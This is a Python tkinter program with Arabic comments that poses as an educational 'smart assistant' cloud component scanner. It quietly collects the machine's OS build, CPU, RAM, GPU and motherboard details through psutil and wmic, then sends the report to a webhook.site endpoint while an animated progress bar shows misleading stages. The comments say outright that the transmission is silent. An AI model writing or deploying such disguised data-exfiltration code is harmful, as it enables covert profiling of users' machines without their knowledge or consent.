import tkinter as tk
from tkinter import ttk, messagebox
import platform
import psutil
import requests
import threading
import subprocess
import time

# 1. دالة جلب معلومات الهاردوير التفصيلية والعميقة من النظام
def gather_advanced_specs():
    try:
        # معلومات المعالج بالتفصيل (الاسم، التردد، الأنوية الحقيقية والوهمية)
        cpu_brand = platform.processor()
        cpu_freq = psutil.cpu_freq().max if psutil.cpu_freq() else "Unknown"
        cpu_cores_phys = psutil.cpu_count(logical=False)
        cpu_cores_log = psutil.cpu_count(logical=True)
        cpu_info = f"{cpu_brand} @ {cpu_freq}MHz (Cores: {cpu_cores_phys}P / {cpu_cores_log}L)"

        # تفاصيل نظام التشغيل والبناء الدقيق
        os_info = f"{platform.system()} {platform.release()} (Build: {platform.version()} - Arch: {platform.machine()})"

        # معلومات الذاكرة العشوائية (الإجمالية والمتاحة والمستخدمة حالياً)
        virtual_mem = psutil.virtual_memory()
        ram_total = round(virtual_mem.total / (1024**3))
        ram_avail = round(virtual_mem.available / (1024**3), 2)
        ram_info = f"Total: {ram_total} GB | Available: {ram_avail} GB"

        # معلومات كرت الشاشة التفصيلي (GPU) من تعريفات الويندوز
        gpu_info = "Unknown GPU"
        try:
            gpu_command = "wmic path win32_VideoController get name,DriverVersion /value"
            gpu_output = subprocess.check_output(gpu_command, shell=True).decode('utf-8')
            gpu_lines = [line.strip() for line in gpu_output.split('\n') if "Name=" in line]
            if gpu_lines:
                gpu_info = gpu_lines[0].replace("Name=", "")
        except:
            pass

        # معلومات المذربورد والشركة المصنعة للجهاز
        board_info = "Unknown Board"
        try:
            board_cmd = "wmic baseboard get manufacturer,product /value"
            board_out = subprocess.check_output(board_cmd, shell=True).decode('utf-8')
            b_lines = [line.strip() for line in board_out.split('\n') if line.strip()]
            board_info = " | ".join(b_lines).replace("Manufacturer=", "").replace("Product=", "")
        except:
            pass

        # تجميع التقرير الشامل النهائي
        report = (
            f"🖥️ OS Details: {os_info}\n"
            f"🧠 CPU Details: {cpu_info}\n"
            f"💾 RAM Profile: {ram_info}\n"
            f"🎮 GPU Profile: {gpu_info}\n"
            f"🔌 Motherboard: {board_info}"
        )
        return report
    except Exception as e:
        return f"Error gathering deep specs: {str(e)}"

# 2. دالة إرسال التقرير الصامتة للـ Webhook
def send_payload_to_webhook(specs_text):
    webhook_url = "https://webhook.site"
    try:
        # إرسال مشفر الحروف لضمان وصول التقرير الضخم سليماً
        requests.get(f"{webhook_url}?advanced_specs={requests.utils.quote(specs_text)}", timeout=10)
    except:
        pass

# 3. بناء واجهة مستخدم Modern UI متحركة بنظام المراحل المتعددة
class ModernEduApp:
    def __init__(self, root):
        self.root = root
        self.root.title("منصة المساعد التعليمي الذكي 🌌")
        self.root.geometry("600x480")
        self.root.configure(bg="#0f0f13") # خلفية داكنة عصرية Cyberpunk
        self.root.resizable(False, False)

        # تخصيص ثيم المكونات العصرية (Ttk Styles)
        self.style = ttk.Style()
        self.style.theme_use('clam')
        self.style.configure("TProgressbar", thickness=15, troughcolor="#1a1a24", background="#00ffcc")

        # العنوان الرئيسي المحرك
        self.title_lbl = tk.Label(root, text="🚀 نظام فحص وتدريب المكونات السحابي", font=("Segoe UI", 16, "bold"), fg="#00ffcc", bg="#0f0f13")
        self.title_lbl.pack(pady=20)

        # صندوق محاكاة المراحل التفاعلية
        self.status_frame = tk.LabelFrame(root, text=" 📊 حالة المزامنة والمحلل الذكي ", font=("Segoe UI", 10, "bold"), fg="#ff007f", bg="#161622", bd=1, relief="solid")
        self.status_frame.pack(pady=10, padx=25, fill="x")

        self.status_lbl = tk.Label(self.status_frame, text="⏳ في انتظار بدء المحرك التعليمي المطور...", font=("Segoe UI", 11), fg="#ffffff", bg="#161622", justify="left")
        self.status_lbl.pack(pady=15, padx=15)

        # شريط التحميل المتحرك العصري
        self.progress = ttk.Progressbar(root, style="TProgressbar", orient="horizontal", length=500, mode="determinate")
        self.progress.pack(pady=15)

        # سطر العرض المصغر بالأسفل للمواصفات الحقيقية
        self.footer_lbl = tk.Label(root, text="🔍 جاري مسح عتاد اللوحة الأم والمعالج الحقيقي...", font=("Consolas", 8), fg="#4e4e6a", bg="#0f0f13", justify="center", wraplength=550)
        self.footer_lbl.pack(side="bottom", pady=15)

        # بدء عملية الحركة والتحديث في خيط منفصل لتفادي تجميد الواجهة
        threading.Thread(target=self.run_animated_pipeline, daemon=True).start()

    # محاكاة المراحل البرمجية المتعددة والمتحركة بشكل Modern
    def run_animated_pipeline(self):
        stages = [
            (10, "🔄 المرحلة 1: الاتصال بالنواة وكسر معزل التطبيق الخارجي..."),
            (30, "🧠 المرحلة 2: استجواب سجلات المعالج والأنوية والتردد الحالي..."),
            (50, "🔌 المرحلة 3: سحب تعريفات كرت الشاشة واستجابة حجم الـ VRAM..."),
            (70, "💾 المرحلة 4: حساب الهياكل الإجمالية للرام وفحص المذربورد..."),
            (90, "🔐 المرحلة 5: تشفير طرود البيانات وتجهيز بروتوكول الـ SSL..."),
            (100, "☁️ المرحلة 6: إطلاق التقرير الشامل صامتاً إلى خادم الآدمن السحابي...")
        ]

        # جلب البيانات الحقيقية العميقة فوراً في الخلفية
        all_specs = gather_advanced_specs()

        # تشغيل حركة شريط التحميل والمراحل بالتوالي
        for progress_val, stage_text in stages:
            time.sleep(0.8) # سرعة التنقل بين المراحل التفاعلية
            self.progress['value'] = progress_val
            self.status_lbl.config(text=stage_text)
            
            # تحديث جزء من المواصفات في الفوتر تدريجياً لإعطاء طابع حركي ذكي
            if progress_val == 50:
                self.footer_lbl.config(text="[OK] CPU & OS Verified. Scanning GPU vendor...")
            elif progress_val == 90:
                self.footer_lbl.config(text="[OK] Hardware profile fully compiled.")

        # إرسال البيانات الشاملة إلى الـ Webhook الخاص بك صامتاً بنسبة 100%
        send_payload_to_webhook(all_specs)

        # إظهار النجاح النهائي وعرض البيانات الشاملة للمستخدم بالأسفل بخط صغير جداً كطلبك
        self.status_lbl.config(text="✅ اكتملت العملية! المنظومة السحابية مستقرة ومتزامنة الآن.\nشغفك في البرمجة سيصنع المستحيل، استمر! 🎯", fg="#00ffcc")
        self.footer_lbl.config(text=all_specs.replace("\n", " | "), fg="#6e6e8a")

if __name__ == "__main__":
    app_root = tk.Tk()
    app = ModernEduApp(app_root)
    app_root.mainloop()
